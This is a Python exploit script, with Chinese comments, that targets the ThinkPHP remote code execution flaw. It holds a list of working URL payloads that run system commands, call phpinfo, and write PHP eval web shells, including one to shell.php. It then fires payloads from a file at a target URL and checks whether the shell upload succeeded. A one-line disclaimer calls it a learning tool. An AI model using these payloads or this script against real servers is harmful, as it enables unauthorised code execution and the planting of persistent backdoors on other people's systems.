import requests
import time
# from lxml import etree
import optparse
print("*"*30 + "Thinkphp远程代码执行" + "*"*30)

'''
参考的payload:
如果不是用python测试的话，那么就要把里面的双反斜杠换为单反斜杠
1、利用system函数远程命令执行
?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

2.通过phpinfo函数写出phpinfo()的信息
?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

3.写入shell:
?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php @eval($_GET["code"])?^>>shell.php

?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php?echo?'ok';?>

?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=phpinfo();

?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian]);

?s=index/\\think\Container/invokefunction&function=call_user_func&vars[0]=phpinfo&vars[1]=1
'''

#datetime--20200318
#Author--cmdback
#免责声明：此实验所用的工具仅限于学习，请勿非法使用，否则后果自负

#payload = '/thinkphp/public/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami'


headers = {
    'User - Agent': 'Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 80.0.3987.132Safari / 537.36'

}
def get_info():
    try:
        #先测试url是否可以正常访问
        res = requests.get(url)
        if res.status_code == 200:
            get_system()
        else:
            print("此网站无法正常访问！！")
    except Exception as e:
        print(e)

def get_system():

    #进行payload的发送，并返回测试结果,这个模块知识测试的是远程执行系统命令
    with open('payload.txt','r') as f:
        try:
            payloads = f.readlines()
            for payload in payloads:
                #将url和payload进行拼接，如果单个url测得话还可以，如果是批量多个地址进行测试，这个脚本还可再调整一下
                res = requests.get(url+payload,headers=headers)
                # html = etree.HTML(res.text,etree.HTMLParser())
                # cmd_line = html.xpath('//body/text()')
                #这里是需要进行去重一下，代码先这样写。
                if res.status_code == 200:
                    print("执行命令如下：",res.text + '\n')
                    #判断写入文件是否成功
                    if requests.get(url+'/shell.php').status_code == 200:
                        print("上传脚本成功，木马脚本地址为：",url+'/shell.php')
                else:
                    return False
        except Exception as e:
            print(e)

#getsheell的测试函数先放在这里，后期补充。
def get_shell():
    pass

if __name__ == '__main__':
    '''
    参数详解：
    1、url：添加需要的url地址；
    2、payload:自己添加的payload，文件中需要换行输入
    '''
    usage ="python -u <target url> -p <target payload>"
    parse = optparse.OptionParser(usage)
    parse.add_option('-u',"--url",dest="url",help="Enter url")
    parse.add_option('-p','--payload',dest='payload',help="Enter payload")
    options,args=parse.parse_args()
    if options.url == None or options.payload == None:
        print(parse.usage)
    else:
        url = options.url
        payload = options.payload
    get_info()

